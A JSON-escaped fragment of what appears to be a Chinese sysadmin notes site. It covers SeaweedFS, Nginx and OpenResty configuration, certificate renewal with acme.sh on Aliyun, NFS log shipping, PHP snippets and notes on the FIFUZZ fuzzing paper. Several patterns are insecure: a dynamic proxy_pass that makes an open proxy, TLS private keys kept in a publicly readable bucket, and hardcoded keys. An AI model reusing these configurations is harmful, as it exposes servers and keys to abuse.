<p>\u5efa\u8bae\u5728\u6d4b\u8bd5\u7684\u65f6\u5019\u4e0d\u8981\u7528<code>-filer.disableDirListing</code>\u9009\u9879\uff0c\u53ef\u4ee5\u5217\u76ee\u5f55\u6765\u770b\u770b\u5230\u5e95\u4e0a\u4f20\u5230\u54ea\u4e86\uff1a<code>curl  -H \"Accept: application/json\" \"http://weedfs:8888/my_images/?pretty=y\"</code></p> <p>\u53e6\u5916\u6ce8\u610f\u542f\u52a8\u524d\u521b\u5efa\u6587\u4ef6\u5939\u548c\u914d\u7f6e\u6743\u9650\uff1a\uff08\u4e0d\u8981\u4ee5\u4e3a\u4eba\u5bb6\u4f1a\u7ed9\u4f60\u521b\u5efa\u76ee\u5f55\uff09</p> <pre><code>mkdir -p /data/weedfs/logs/\nmkdir -p /data/weedfs/filer/\nsudo chown -R nobody /data/weedfs\n</code></pre>"},{"location":"Nginx/#b","title":"B\u670d\u52a1\u5668\u7684\u5b9e\u73b0","text":"<pre><code>TARGET_SERVER = \"http://images.example.com/\"\nWEEDFS_FILER_ENDPOINT = \"http://nginx/upload_images/\"\n\nfrom flask import Flask, Response\nimport requests\nimport io\nsess = requests.session()\napp = Flask(__name__)\n\n@app.route(\"/my_images/&lt;name&gt;\")\ndef handler(name):\n    x = sess.get(TARGET_SERVER+name)\n    sess.post(WEEDFS_FILER_ENDPOINT, files=[('filename', (name, io.BytesIO(x.content)))])\n    return Response(x.content, mimetype=\"image/jpeg\") \n</code></pre>"},{"location":"Nginx/#pythonpyseaweed","title":"\u987a\u4fbf\u9644\u4e0aPython\u5e93pyseaweed\u7684\u4f7f\u7528","text":"<p>pip install pyseaweed</p> <p>\u5982\u679c\u670d\u52a1\u5668\u542f\u52a8\u7684\u65f6\u5019\u914d\u7f6e\u7684<code>publicUrl</code>\u4ee5<code>https://</code>\u5f00\u5934\uff0c\u8fd9\u4e2a<code>pyseaweed</code>\u5e93\u662f\u6709\u95ee\u9898\u7684\uff0c\u9700\u8981\u624b\u52a8\u4fee\u51e0\u5904url\u6784\u9020\u7684\u5730\u65b9</p> <pre><code>publicurl = \"http://localhost:8080/\"\n\nfrom pyseaweed import WeedFS\nw = WeedFS(\"localhost\", 9333, use_session=True)\n# \u4e0a\u4f20 \u4e5f\u652f\u6301\u4f20\u5165\u6d41\nfid = w.upload_file(filename)\n\n# \u4e0b\u8f7d \u5f97\u5230\u5bf9\u8c61\u5b57\u8282\ndata = w.conn._conn.get(publicurl+fid).content\n</code></pre>"},{"location":"Nginx/#proxy_pass","title":"proxy_pass \u52a8\u6001\u4ee3\u7406","text":"<p>\u6548\u679c\uff1a\u8bbf\u95ee<code>/www.example.com/</code> \u53cd\u5411\u4ee3\u7406\u5230<code>http://www.example.com</code>\uff0c\u5e76\u652f\u6301\u4e00\u6b21\u8df3\u8f6c</p> <pre><code>location ~ ^/(.*)$ {\nproxy_pass http://$1;\nproxy_intercept_errors on;\nerror_page 301 302 307 = @handle_redirect;\n}\n\nlocation @handle_redirect {\nset $saved_redirect_location '$upstream_http_location';\nproxy_pass $saved_redirect_location;\n}\n</code></pre>"},{"location":"Nginx/#nginxserver","title":"Nginx\u9690\u85cfServer\u5934 \u7b80\u5355\u65b9\u5f0f","text":"<p>\u53c2\u8003\uff1a https://serverfault.com/questions/214242/can-i-hide-all-server-os-info</p> <pre><code>apt install -y nginx-extras\n</code></pre> <p>\u914d\u7f6e\u4e2d\u6dfb\u52a0\uff1a</p> <pre><code>header_filter_by_lua 'ngx.header[\"server\"] = nil';\n</code></pre>"},{"location":"Nginx/#https_1","title":"\u4f7f\u7528\u963f\u91cc\u4e91\u51fd\u6570\u8ba1\u7b97\u5b9a\u65f6\u66f4\u65b0https\u8bc1\u4e66","text":"<p>\u4e3a\u4e86\u51cf\u5c11\u5bf9vps\u7684\u4f9d\u8d56\uff0c\u9010\u6b65\u5c06\u4e00\u4e9b\u5728\u670d\u52a1\u5668\u4e0a\u8dd1\u7684\u4efb\u52a1\u8fc1\u79fb\u5230\u66f4\u52a0\u53ef\u9760\u7684\u51fd\u6570\u8ba1\u7b97</p> <p>\u8fd9\u4e0d\u662f\u4e00\u4e2a\u8be6\u7ec6\u7684\u6559\u7a0b\uff0c\u4f60\u8fd8\u9700\u8981\u81ea\u884c\u63a2\u7d22\u7814\u7a76</p>"},{"location":"Nginx/#_4","title":"\u5165\u53e3","text":"<p>https://fc.console.aliyun.com</p> <p>\u5173\u952e\u8bcd\uff1a \u6559\u7a0b \u5b9a\u4ef7 128MB\u662f\u514d\u8d39\u7684 \u5b9a\u65f6\u89e6\u53d1\u5668 \u65e5\u5fd7\u670d\u52a1</p>"},{"location":"Nginx/#_5","title":"\u4ee3\u7801\u6846\u67b6","text":"<p>Python3 \u5148\u672c\u5730<code>git clone --depth 1 https://github.com/Neilpang/acme.sh</code>\uff0c\u518d\u521b\u5efa\u4e2aindex.py \u628a\u4ee3\u7801\u6587\u4ef6\u5939\u4e0a\u4f20\u4e0a\u53bb</p> <p>\u7f51\u9875\u4e0a\u5728\u7ebf\u7f16\u8f91index.py\u4e0d\u4f1a\u4e22\u5931acme.sh\u6587\u4ef6\u5939\uff08\u53ea\u4f1a\u6539\u52a8index.py\uff09\uff0c\u4ee3\u7801\u6539\u52a8\u540e\u5c31\u80fd\u76f4\u63a5\u8fd0\u884c\u770b\u5230\u7ed3\u679c\uff08\u5b9e\u65f6\u8f93\u51fa\u9700\u8981\u53bb\u65e5\u5fd7\u670d\u52a1\u641c\u7d22\uff09\uff0c\u8fd8\u662f\u633a\u597d\u7528\u7684</p> <p>\u4f7f\u7528\u8fd9\u4e2a\u4ee3\u7801\u9700\u8981\u5148\u521b\u5efa\u4e00\u4e2a\u53ef\u4ee5\u8bbf\u95eeOSS\u7684AccessKey\uff0c\u586b\u5165<code>oss2.Auth</code>\u90e8\u5206\u2014\u2014\u5c06\u751f\u6210\u7684https\u8bc1\u4e66\u548c\u79c1\u94a5\u5b58\u50a8\u5230OSS\uff0c\u5c06Key\u786c\u7f16\u7801\u5230\u4ee3\u7801\u4e2d\u4e0d\u662f\u4e00\u4e2a\u597d\u4e60\u60ef\uff0c\u8fd9\u91cc\u5c31\u7b80\u5355\u7c97\u66b4\u5b9e\u73b0\u4e86</p> <p>\u57df\u540d\u9a8c\u8bc1\u65b9\u5f0f\u7528\u7684\u662fchallenge-alias\u7684dns\u9a8c\u8bc1\uff0c\u9700\u8981\u5c06<code>_acme-challenge.py3.io</code>\u8bbe\u7f6eCNAME\u5230<code>_acme-challenge.chenyuan.me</code>\u3002 \u5982\u679c\u4f60\u8fd8\u9700\u8981\u66f4\u591a\u7684\u5b50\u57df\u540d\u5982<code>*.subdomain.py3.io</code>\uff0c\u90a3\u4e5f\u8981\u628a<code>_acme-challenge.subdomain.py3.io</code>\u8bbe\u7f6eCNAME\u5230<code>_acme-challenge.chenyuan.me</code></p> <p>\u7528\u7684\u662fcloudflare\u7684API\uff0c\u9700\u8981\u63d0\u4f9b<code>CF_Key</code>\u548c<code>CF_Email</code>\uff0c\u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528\u66f4\u591a\u7684API</p> <p>\u5b9a\u65f6\u5668\u8bbe\u7f6e\u5341\u4e94\u5929\u6267\u884c\u4e00\u6b21\uff0ccron\u8868\u8fbe\u5f0f\u4e3a\uff1a<code>0 0 0 1,15 * *</code></p> <p>\u4f60\u9700\u8981\u66ff\u6362\u4e0b\u9762\u4ee3\u7801\u7684REGION OSS\u5730\u57df, AK, SK \u53ef\u4ee5\u8bbf\u95eeOSS\u7684\u5bc6\u94a5, OSSNAME \u4f7f\u7528\u7684OSS\u540d\u79f0, CF_Key cloudflare\u7684API Key, CF_Email cloudflare\u7684\u7528\u6237\u540d\u90ae\u7bb1, <code>chenyuan.me</code> \u5728cloudflare\u4e0a\u6258\u7ba1\u7684\u57df\u540d, <code>py3io_ATxx</code>\u7533\u8bf7\u5f97\u5230\u7684\u8bc1\u4e66\u7684\u540d\u79f0 \u52a0\u5165\u968f\u673a\u5b57\u7b26\u4e32\u907f\u514d\u88ab\u731c\u5230, <code>[\"py3.io\", \"*.py3.io\"]</code> \u7533\u8bf7\u7684\u57df\u540d\u5217\u8868</p> <pre><code># -*- coding: utf-8 -*-\nimport os\nimport logging\nimport random\nimport os\nimport oss2\nimport io\nimport time\nimport string\nimport json\nlogger = logging.getLogger()\nendpoint = 'http://oss-cn-REGION-internal.aliyuncs.com' \nauth = oss2.Auth('AK', 'SK')\nbucket = oss2.Bucket(auth, endpoint, 'OSSNAME')\n\ndef getcert(name, domains):\n    global logger\n    try:\n        try:\n            lasttime = bucket.get_object_meta(name+\".crt\").last_modified \n            if time.time() - lasttime &lt;= 86400 * 60:\n                # do not recreate cert for 60 days\n                logger.info('Skip cert for '+name)\n                return\n        except:\n            pass\n\n        logger.info('Getting cert for '+name)\n        domain_text = \"-d '\" + \"' -d '\".join(domains) + \"'\"\n        cmd = \"CF_Key=xxx CF_Email=xxx@yyy.com ./acme.sh/acme.sh --issue --dns dns_cf \"+domain_text+\" --dnssleep 5 --fullchain-file /tmp/\"+name+\".crt --key-file /tmp/\"+name+\".key -f \"\n        if name != \"chenyuan.me\":\n            cmd += \"--challenge-alias chenyuan.me\"\n        print(\"acme.sh --issue\"+cmd.split(\"--issue\")[1])\n        assert os.system(cmd)==0, \"get cert failed\"\n        bucket.put_object_from_file(name+\".crt\", \"/tmp/\"+name+\".crt\")\n        bucket.put_object_from_file(name+\".key\", \"/tmp/\"+name+\".key\")\n        logger.info('Done for '+name)\n    except Exception as e:\n        logger.exception(\"exception happend: \"+ name)\n\ndef handler(event, context):\n    getcert(\"py3io_ATxx\", [\"py3.io\", \"*.py3.io\"])\n    return 'ok'\n</code></pre>"},{"location":"Nginx/#_6","title":"\u66f4\u591a\u8bf4\u660e","text":"<p>\u53d6\u5f97\u4e00\u4e2a\u57df\u540d\u7684\u8bc1\u4e66\u5927\u7ea6\u9700\u89811~2\u5206\u949f\uff0c\u7531\u4e8e\u51fd\u6570\u8ba1\u7b97\u5141\u8bb8\u7684\u6700\u957f\u8d85\u65f6\u662f600\u79d2\uff0c\u8fd8\u6709\u8003\u8651\u7f51\u7edc\u56e0\u7d20\uff08\u6bd5\u7adfcloudflare\u548clet\u2019s encrypt\u90fd\u5728\u56fd\u5916\uff09\uff0c \u662f\u6709\u53ef\u80fd\u5931\u8d25\u7684</p> <p>\u6211\u91c7\u53d6\u7684\u7b56\u7565\u5c31\u5f88\u7b80\u5355\u7c97\u66b4 \u6bcf15\u5929\u6267\u884c\u4e00\u904d\uff0c\u4e00\u4e2a\u57df\u540d\u5931\u8d25\u4e86\u4e0d\u5f71\u54cd\u5176\u4ed6\u57df\u540d\u7684\u5c1d\u8bd5\uff0c60\u5929\u5185\u6210\u529f\u4e86\u7684\u57df\u540d\u4e0d\u4f1a\u53cd\u590d\u7533\u8bf7\uff0c\u603b\u4f1a\u6210\u529f\u7684</p> <p>\u5b89\u5168\u6027\uff1a\u4e3a\u4e86\u4fbf\u4e8e\u5c06\u8bc1\u4e66\u90e8\u7f72\u5230web\u670d\u52a1\u5668\uff0cOSS\u4ed3\u5e93\u662f\u8bbe\u7f6e\u6210\u516c\u5f00\u8bfb\u7684\uff0c\u8fd9\u6837\u5c31\u53ef\u80fd\u6cc4\u9732\u79c1\u94a5\u6587\u4ef6\uff08\u653b\u51fb\u8005\u77e5\u9053OSS\u540d\u79f0\uff0c\u731c\u5230\u6587\u4ef6\u540d\u79f0\uff09\uff0c\u4f60\u53ef\u4ee5\u7528Referer\u9650\u5236\u6765\u589e\u52a0\u4e00\u70b9\u5b89\u5168\u6027</p>"},{"location":"Nginx/#web","title":"web\u670d\u52a1\u5668\u4e0a\u7684\u90e8\u7f72","text":"<p>\u4e5f\u662f\u5199\u4e00\u4e2a\u5b9a\u65f6\u4efb\u52a1\u54af <code>0 0 0 3,17 * *</code>\uff0c\u6bcf\u4e2a\u67083\u53f7\u548c17\u53f7\u7528curl\u83b7\u53d6\u4e00\u4e0b\u6700\u65b0\u7684\u8bc1\u4e66</p> <p>\u5982\u679cnginx\u7684\u914d\u7f6e\u539f\u5148\u5c31\u662f\u9519\u7684\uff0c\u4e0d\u4f1a\u5c1d\u8bd5\u66f4\u65b0\u8bc1\u4e66</p> <p>\u5982\u679c\u66f4\u65b0\u8bc1\u4e66\u540enginx\u65e0\u6cd5\u542f\u52a8\uff08\u6bd4\u5982\u65e0\u6cd5\u8fde\u4e0a\u963f\u91cc\u4e91\u4e0b\u8f7d\u7684\u6587\u4ef6\u4e3a\u7a7a\u6216404\uff09\uff0c\u4f1a\u56de\u6eda\u8fd9\u4e2a\u6539\u52a8\uff0c\u4fdd\u8bc1nginx\u4ecd\u7136\u53ef\u4ee5\u542f\u52a8</p> <p>\u4f60\u9700\u8981\u66ff\u6362\u4e0b\u9762\u4ee3\u7801\u7684NAME, OSSNAME, REGION \u540c\u4e0a, Referer_STRING \u5728OSS\u8bbe\u7f6e\u7684\u53ea\u5141\u8bb8\u8fd9\u4e2aReferer_STRING\u8bbf\u95ee \u4e0d\u5141\u8bb8Referer\u4e3a\u7a7a \u589e\u52a0\u5b89\u5168\u6027</p> <pre><code>#!/bin/bash\nset -ex\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\ncd /var/www\nNAME=\"py3io_ATxx\"\ncurl -o ${NAME}.crt.new https://OSSNAME.oss-cn-REGION.aliyuncs.com/${NAME}.crt -H \"Referer: Referer_STRING\"\ncurl -o ${NAME}.key.new https://OSSNAME.oss-cn-REGION.aliyuncs.com/${NAME}.key -H \"Referer: Referer_STRING\"\nnginx -s reload\nmv ${NAME}.crt ${NAME}.crt.old\nmv ${NAME}.key ${NAME}.key.old\nmv ${NAME}.crt.new ${NAME}.crt\nmv ${NAME}.key.new ${NAME}.key\nnginx -s reload || (mv ${NAME}.crt.old ${NAME}.crt; mv ${NAME}.key.old ${NAME}.key)\n</code></pre>"},{"location":"Nginx/#nfsnginx","title":"\u4f7f\u7528nfs\u5b58\u50a8Nginx\u65e5\u5fd7","text":"<p>\u8003\u8651\u4e00\u4e2a\u4e0d\u7a33\u5b9a\u7684\u5b58\u50a8\u4ecb\u8d28 \u5982\u6811\u8393\u6d3e\uff0c\u60f3\u7b80\u5355\u5730\u628a\u65e5\u5fd7\u5b58\u50a8\u5230\u5176\u4ed6\u670d\u52a1\u5668\u4e0a</p> <p>\u7531\u4e8enfs\u53ef\u80fd\u7531\u4e8e\u7f51\u7edchang\uff0c\u800cNginx\u5728\u65e0\u6cd5\u5199\u65e5\u5fd7\u7684\u65f6\u5019\u4e5f\u65e0\u6cd5\u63d0\u4f9bweb\u8bbf\u95ee\uff0c \u6240\u4ee5\u6211\u7684\u505a\u6cd5\u662f\u5148\u5199\u5230\u672c\u5730\uff0c\u6bcf\u4e2a\u5c0f\u65f6\u5c06\u65b0\u7684log\u8ffd\u52a0\u5230nfs\u540c\u540d<code>.1</code>\u6587\u4ef6\u91cc</p> <p>\u7528\u5230\u7684\uff1anfs\uff0cNginx SIGUSR1\u4fe1\u53f7\uff0c\u5b9a\u65f6\u4efb\u52a1</p> <p>\u670d\u52a1\u7aef\u7684nfs\u955c\u50cf\uff1a https://hub.docker.com/r/itsthenetwork/nfs-server-alpine/</p> <pre><code>docker run --restart=always -d --name nfs -v /data:/nfsshare --privileged --net=host -e SHARED_DIRECTORY=/nfsshare itsthenetwork/nfs-server-alpine\n</code></pre> <p>\u5ba2\u6237\u7aef\uff08web\u670d\u52a1\u5668\uff09\uff1a</p> <pre><code>mkdir /nfs\nmount SERVER_IP:/ /nfs\n</code></pre> <p>collectlog.sh\u5199\u5230/nfs\u91cc\uff0c\u5982\u679cnfs\u53d1\u751f\u4e86hang\uff0c\u811a\u672c\u4e5f\u4e0d\u4f1a\u6267\u884c</p> <pre><code>#!/bin/bash\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\ncd /var/log/nginx\nfor i in *.log; do\nmv $i ${i}.1;\ndone\nkill -USR1 `cat /var/run/nginx.pid`\nsleep 1\nfor i in *.log.1; do\ncat $i &gt;&gt; /nfs/$i\ndone\n</code></pre> <p>cron\u52a0\u5165\uff1a\u6bcf\u5c0f\u65f6\u5199\u5165\u4e00\u6b21</p> <pre><code>0 * * * * /nfs/collectlog.sh\n</code></pre>"},{"location":"Nginx/#openresty-luahook","title":"\u4f7f\u7528openresty Lua\u7f16\u7a0b\u5b9e\u73b0hook\u8df3\u8f6c","text":"<p>\u9700\u6c42\uff1a\u6709\u591a\u4e2a\u7f51\u7ad9\u7528\u6237\u8bbf\u95ee\u4e4b\u524d\u9700\u8981\u5e26\u4e0aauthtoken\uff0c\u6ca1\u6709\u8fd9\u4e2aCookie\u5219\u5148\u8df3\u8f6c\u5230\u767b\u5f55\u754c\u9762</p> <p>\u4f7f\u7528openresty\u6765\u65b9\u4fbf\u5730\u5199Lua\uff1a</p> <p>\u5b89\u88c5\u53c2\u8003 https://openresty.org/cn/linux-packages.html</p> <pre><code>sudo apt-get -y install --no-install-recommends wget gnupg ca-certificates\nwget -O - https://openresty.org/package/pubkey.gpg | sudo apt-key add -\necho \"deb http://openresty.org/package/ubuntu $(lsb_release -sc) main\" \\\n    | sudo tee /etc/apt/sources.list.d/openresty.list\nsudo apt-get update\nsudo apt-get -y install openresty\n</code></pre> <p>\u53ef\u80fd\u4f60\u4f1a\u559c\u6b22\u539f\u6765\u7684nginx\u7684\u76ee\u5f55\u8bbe\u7f6e\uff0c\u505a\u4e2a\u8f6f\u94fe\u63a5\u5457\uff1a</p> <pre><code>ln -s /usr/local/openresty/nginx/logs /var/log/nginx\nalias nginx=openresty\n</code></pre> <p>\u5feb\u901f\u5165\u95e8\uff1a https://openresty.org/cn/getting-started.html</p> <p>\u5c31\u662fcontent_by_lua_block\u91cc\u9762\u76f4\u63a5\u5199lua\u4ee3\u7801\u5373\u53ef</p> <pre><code>http {\n    server {\n        listen 8080;\n        location / {\n            default_type text/html;\n            content_by_lua_block {\n                ngx.say(\"&lt;p&gt;hello, world&lt;/p&gt;\")\n            }\n        }\n    }\n}\n</code></pre> <p>\u60f3\u77e5\u9053ngx\u6709\u54ea\u4e9b\u65b9\u6cd5\uff0c\u770b\u8fd9\u4e2a\u6587\u6863\uff1a https://github.com/openresty/lua-nginx-module#ngxarg</p> <p>\u4f8b\u5982\u83b7\u53d6http GET\u7684a\u53c2\u6570\uff1a<code>ngx.var.arg_a</code>, \u8bf7\u6c42\u7684Host\u53c2\u6570\uff1a<code>ngx.var.http_host</code></p> <p>\u83b7\u53d6Cookie: \u4f7f\u7528https://github.com/cloudflare/lua-resty-cookie</p> <p>\u5148\u6267\u884c\uff1a<code>wget -O /etc/openresty/cookie.lua https://github.com/cloudflare/lua-resty-cookie/raw/master/lib/resty/cookie.lua</code></p> <p>\u5728http\u4e2d\u52a0\u5165: <code>lua_package_path \"/etc/openresty/?.lua;;\";</code></p> <pre><code>local ck = require \"cookie\"\nlocal cookie, err = ck:new()\nif not cookie then\nngx.log(ngx.ERR, err)\nreturn\nend\n#\u7136\u540e\u5373\u53ef\u4f7f\u7528cookie:get(\"authtoken\")\n</code></pre> <p>\u60f3\u4f7f\u7528rewrite_by_lua_file\u5219\u9700\u8981\u628a\u6587\u4ef6\u653e\u5728/usr/local/openresty/nginx</p> <p>\u7ed3\u675f\u5f53\u524d\u811a\u672c\u7ee7\u7eed\u540e\u7eed\u8bf7\u6c42\u5904\u7406 \u7528<code>ngx.exit(0)</code></p> <p>\u7ed3\u675f\u6574\u4e2a\u8bf7\u6c42 \u7528<code>ngx.exit(200)</code></p> <p>\u8df3\u8f6c\u7528 <code>ngx.redirect(\"https://py3.io\")</code></p> <p>Lua\u7684\u4e09\u76ee\u8fd0\u7b97\uff1a <code>a and b or c</code></p>"},{"location":"Nginx/#_7","title":"\u4e0d\u540c\u5b50\u57df\u540d\u53cd\u4ee3\u5230\u4e0d\u540c\u7aef\u53e3","text":"<p>\u4f60\u53ef\u4ee5\u590d\u5236\u7c98\u8d34\u591a\u4e2aserver\u5757\uff0c\u4f46\u4f7f\u7528map\u662f\u4e00\u4e2a\u66f4\u4f18\u96c5\u7684\u65b9\u6848</p> <pre><code>http {\nmap $subdomain $subdomain_port {\nsubdomain1 12345;\nsubdomain2 54321;\ndefault 1;\n}\nserver {\nlisten 80;\nserver_name ~^(?P&lt;subdomain&gt;.+?)\\.2020\\.actf\\.lol$;\nlocation / {\nproxy_pass http://127.0.0.1:$subdomain_port;\nproxy_redirect off;\nproxy_set_header Host $host;\nproxy_set_header X-Real-IP $remote_addr;\n}\n}\n}\n</code></pre>"},{"location":"Nginx/#nginx_4","title":"Nginx\u914d\u7f6e\u6587\u4ef6\u683c\u5f0f\u5316","text":"<p>\u76f4\u63a5\u7528vi\u6539\u4e86\u914d\u7f6e\u6587\u4ef6\u540e\uff0c\u5f88\u5bb9\u6613\u4e0d\u6ce8\u610f\u7f29\u8fdb\uff0c\u6709\u6ca1\u6709\u4e00\u4e2a\u81ea\u52a8prettify\u7684\u5de5\u5177\u5462</p> <p>\u8fd8\u771f\u6709\uff1a https://github.com/1connect/nginx-config-formatter</p> <pre><code>wget https://raw.githubusercontent.com/1connect/nginx-config-formatter/master/nginxfmt.py\npython3 nginxfmt.py /etc/nginx/nginx.conf\n</code></pre>"},{"location":"PHP/","title":"PHP","text":""},{"location":"PHP/#_1","title":"\u663e\u793a\u9519\u8bef\u4fe1\u606f","text":"<p>PHP\u8fd4\u56de500\uff0c\u4e0d\u77e5\u9053\u53d1\u751f\u4e86\u5565\uff0c\u5c31\u5728php\u6587\u4ef6\u5f00\u5934\u663e\u793a\u6240\u6709\u9519\u8bef\uff1a</p> <pre><code>&lt;?php\n    ini_set('display_errors', true);\n    error_reporting(E_ALL);\n</code></pre>"},{"location":"PHP/#iframe","title":"\u5168\u9875\u9762iframe","text":"<pre><code>&lt;!DOCTYPE html&gt;\n&lt;body style=\"padding:0; margin:0;\"&gt;\n&lt;iframe src=\"https://py3.io\" style=\"visibility: visible;height: 100%; position:absolute\" allowtransparency=\"true\" marginheight=\"0\" marginwidth=\"0\" frameborder=\"0\" width=\"100%\"&gt;&lt;/iframe&gt;\n&lt;/body&gt;&lt;/html&gt;\n</code></pre>"},{"location":"PaperReading/","title":"Paper Reading","text":""},{"location":"PaperReading/#fuzzing-error-handling-code-using-context-sensitive-software-fault-injection","title":"Fuzzing error-handling code using context-sensitive software fault injection","text":"<p>USENIX2020 PDF</p> <p>\u8868\u8fbe\uff1a augment \u8bf4\u81ea\u5df1\u7684fuzzer\u80fd\u6709\u6548\u8865\u5145\u589e\u5f3a\u73b0\u6709\u7684fuzzing\u6280\u672f and we are still waiting for the response of remaning ones \u63d0\u4ea4\u4e86bug\u7b49\u5f85\u56de\u590d This manual study is required for gaining the insights into building the automated static analysis \u624b\u5de5\u5206\u6790\u662f\u6709\u5fc5\u8981\u7684</p> <p>\u9519\u8bef\u5904\u7406\u7684\u4ee3\u7801\u4e00\u4e9b\u53ea\u80fd\u5728\u5076\u7136\u60c5\u51b5\u4e0b\u89e6\u53d1 \u5982\u5185\u5b58\u4e0d\u591f \u7f51\u7edc\u8fde\u63a5\u5931\u8d25 \u8fd9\u7bc7\u6587\u7ae0\u7684\u6838\u5fc3\u662fSFI \u4e0a\u4e0b\u6587\u654f\u611f\u7684\u8f6f\u4ef6\u9519\u8bef\u6ce8\u5165 \u53d1\u73b0\u4e86317\u4e2aalert \u6839\u636e\u6839\u672c\u539f\u56e0\u5206\u621050\u4e2aunique bugs</p> <p>error site \u6ce8\u5165\u9519\u8bef\u7684\u4f4d\u7f6e \u6bd4\u5982malloc \u73b0\u6709\u7684\u6280\u672f\u6ca1\u8003\u8651\u4e0a\u4e0b\u6587\uff08\u8c03\u7528\u6808\uff09\u6ce8\u5165\u9519\u8bef\u90a3\u5c31\u4e00\u5b9a\u4f1a\u9519 \u8fd9\u6837\u4f1a\u9519\u8fc7\u4e00\u4e9bbug</p> <p>\u65b9\u6cd5\uff1a     1. \u9759\u6001\u5206\u6790\u627eerror sites \u8fd0\u884c\u65f6\u6709\u53ef\u80fd\u51fa\u9519\u7684\u5730\u65b9 \u53ea\u627e\u5e93\u51fd\u6570\u907f\u514d\u91cd\u590d\uff1b\u627e\u6ee1\u8db3\u6761\u4ef6\u7684\u51fd\u6570\u8c03\u7528\uff1a\u8fd4\u56de\u7684\u662f\u6307\u9488\u6216\u6574\u6570\u3001\u8fd4\u56de\u503c\u4f1a\u548cNULL\u6216\u80050\u6bd4\u8f83\uff0c\u5b9a\u4e49\u4e00\u4e2a\u6bd4\u8f83\u6b21\u6570/\u603b\u6b21\u6570\u7684\u9608\u503cR=0.6     2. \u8fd0\u884c\u88ab\u6d4b\u7a0b\u5e8f \u6536\u96c6\u5230\u8fbe\u6bcf\u4e2aerror site\u80fd\u6709\u54ea\u4e9bcalling context\uff0c\u4ee5\u53ca\u5f53\u524d\u7684coverage     3. \u521b\u5efa\u9519\u8bef\u5e8f\u5217 \u9519\u8bef\u5e8f\u5217\u7684\u6bcf\u4e00\u4e2a\u4e0d\u662ferror site \u800c\u662ferror point  \u5176\u4e2dCallCtx \u662f\u7684\u6570\u7ec4 \u5177\u4f53\u7528\u54c8\u5e0c\u8868\u5b58\u50a8     4. \u53d8\u5f02\u9519\u8bef\u5e8f\u5217      5. \u8fd0\u884c     6. \u770b\u770b\u662f\u5426\u6709\u65b0\u7684coverage \u5faa\u73af <p>\u540c\u65f6\u53d8\u5f02\u9519\u8bef\u5e8f\u5217\u548c\u7a0b\u5e8f\u8f93\u5165</p> <p>\u8d21\u732e\uff1a     * \u505a\u4e86\u4e24\u4e2a\u624b\u5de5\u5206\u6790\uff1a42%\u7684\u9519\u8bef\u5904\u7406\u4ee3\u7801\u90fd\u662f\u5904\u7406\u5076\u7136\u9519\u8bef\uff0c\u5176\u4e2d\u5f88\u5c11\u80fd\u88ab\u73b0\u6709\u7684\u6280\u672f\u89e6\u53d1     * \u57fa\u4e8e\u4e0a\u4e0b\u6587\u654f\u611f\u7684SFI\u7684fuzzing\u57fa\u7840 \u52a8\u6001\u6ce8\u5165\u9519\u8bef\uff0c\u8003\u8651\u4e86\u8c03\u7528\u5173\u7cfb     * FIFUZZ \u7b2c\u4e00\u4e2a\u7cfb\u7edf\u6027\u8003\u8651\u4e86\u4e0d\u540c\u8c03\u7528\u5173\u7cfb\u7684\u6d4b\u8bd5\u9519\u8bef\u5904\u7406\u4ee3\u7801\u7684fuzzing\u6846\u67b6     * \u6d4b\u4e869\u4e2aC\u8bed\u8a00\u7a0b\u5e8f \u53d1\u73b0\u4e8650\u4e2abug \u548cAFL AFLFast AFLSmart FairFuzz\u6bd4\u8f83\u80fd\u53d1\u73b0\u5f88\u591a\u522b\u4eba\u53d1\u73b0\u4e0d\u4e86\u7684bug</p> <p>\u867d\u7136\u9519\u8bef\u5076\u7136\u89e6\u53d1\uff0c\u4f46\u5728adversarial setting\u4e0b\u5374\u53ef\u4ee5\u7a33\u5b9a\u89e6\u53d1 \u5982\u653b\u51fb\u8005\u8017\u5c3d\u5185\u5b58\u80fd\u53ef\u9760\u5730\u8ba9malloc\u8fd4\u56deNULL \uff1b\u540e\u9762\u4e5f\u63d0\u5230\u653b\u51fb\u7a97\u53e3\u592a\u5c0f\u7684\u8bdd \u4e0d\u80fd\u6210\u529f</p> <p>\u5206\u6790\u7684\u8f6f\u4ef6\uff1avim bision ffmpeg nasm catdoc clamav cflow gif2png+libpng openssl \u6bcf\u4e2a\u9009100\u4e2a\u6e90\u4ee3\u7801\u770b\u53d1\u73b0\uff1a 42%\u5076\u7136\u9519\u8bef\uff0c70%\u68c0\u67e5\u8fd4\u56de\u503c\u662f\u4e0d\u662f\u8868\u793a\u9519\u8bef</p> <p>\u770bCVE\u53d1\u73b0fuzzing\u53d1\u73b0\u7684CVE\u4e2d31%\u548c\u9519\u8bef\u5904\u7406\u6709\u5173 \u4f46\u53ea\u67099%\u662f\u5076\u7136\u9519\u8bef</p> <p>\u4e00\u6b21\u53d8\u5f02\u4e00\u4e2a \u5982\u679c\u6ca1\u53d1\u73b0\u65b0\u7684coverage\u5c31\u629b\u5f03</p> <p>ASan\u5f15\u5165\u4e86\u592a\u5927\u7684runtime overhead \u5b9e\u9a8c\u5206\u4e24\u7ec4 \u7528asan\u548c\u4e0d\u7528</p> <p>\u9009vim\u4e00\u4e2a\u7a0b\u5e8f\u6765\u663e\u793a24\u5c0f\u65f6\u5185 \u6709\u7528\u7684\u9519\u8bef\u5e8f\u5217\u3001\u7a0b\u5e8f\u8f93\u5165\u5206\u522b\u968f\u65f6\u95f4\u589e\u957f\u7684\u66f2\u7ebf</p> <p>\u5b9e\u9a8c\u7ed3\u679c\u7684\u8868\u683c\uff1a\u5206asan\u548c\u4e0d\u7528asan\uff0c\u4ea7\u751f\u4e86\u591a\u5c11\u9519\u8bef\u5e8f\u5217\u548cinput \u591a\u5c11\u6709\u7528\uff0c\u53d1\u73b0\u7684bug\u7684\u5206\u7c7b \u4e09\u7c7b\uff1a\u8fd4\u56deNULL\uff0cmalloc\u5931\u8d25\uff0cassert</p> <p>\u9644\u5f55\u7ed950\u4e2a\u968f\u673a\u9009\u7684alerts \u7a0b\u5e8f\u3001\u89e6\u53d1\u5e8f\u5217Error points\u3001\u5d29\u7684\u6e90\u4ee3\u7801\u884c\u53f7\u3001\u9519\u8bef\u7c7b\u522b\u3001\u53cd\u9988\u4fee\u590d\u72b6\u6001</p> <p>\u53d1\u73b0\u768446\u4e2a\u548c\u9519\u8bef\u5904\u7406\u76f8\u5173\u7684bug\u4e2d 